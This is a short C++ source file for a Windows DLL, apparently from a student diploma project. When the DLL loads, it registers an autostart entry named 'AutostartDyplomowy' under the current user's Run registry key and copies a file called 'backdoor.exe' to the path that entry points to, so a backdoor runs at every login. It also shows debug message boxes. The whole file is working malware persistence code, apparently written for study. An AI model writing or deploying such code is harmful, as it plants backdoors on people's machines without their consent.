#include <windows.h>
#include<string>
#include <iostream>
using namespace std;

void addAutostart()
{
    HKEY hkey;
    LPCTSTR keyName = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCTSTR filePath = "C:\\Users\\Patryk\\Desktop\\autostart.exe";
    RegOpenKeyEx(HKEY_CURRENT_USER,keyName,0,KEY_ALL_ACCESS,&hkey);
    RegSetValueEx(hkey,"AutostartDyplomowy",0,1,(LPBYTE)filePath, strlen(filePath)+1);
    RegCloseKey(hkey);
    CopyFile("backdoor.exe", filePath, 0);
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)
{
    switch(reason)
    {
        case DLL_PROCESS_ATTACH:
            addAutostart();
            MessageBox(NULL, "DLL_PROCESS_ATTACH", "Info", MB_OK);
        break;

        case DLL_PROCESS_DETACH:
            MessageBox(NULL, "DLL_PROCESS_DETACH", "Info", MB_OK);
        break;

        case DLL_THREAD_ATTACH:
            MessageBox(NULL, "DLL_THREAD_ATTACH", "Info", MB_OK);
        break;

        case DLL_THREAD_DETACH:
            MessageBox(NULL, "DLL_THREAD_DETACH", "Info", MB_OK);
        break;
    }

    return TRUE;
}
